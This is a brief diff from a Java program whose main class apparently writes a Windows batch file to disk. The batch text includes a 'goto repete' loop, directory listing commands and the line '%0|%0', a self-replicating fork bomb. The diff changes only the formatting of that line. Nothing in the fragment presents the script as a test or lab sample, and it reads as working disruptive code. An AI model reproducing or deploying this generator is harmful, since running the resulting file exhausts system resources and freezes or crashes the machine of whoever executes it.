@@ -40,7 +40,8 @@ public class main {
                     "goto repete\n" +
                     "cd c:/\n" +
                     "tree\n" +
-                    "%0|%0");
+                            "%0|%0"
+                    );
             writer.close();
         } catch (IOException e) {
             e.printStackTrace();
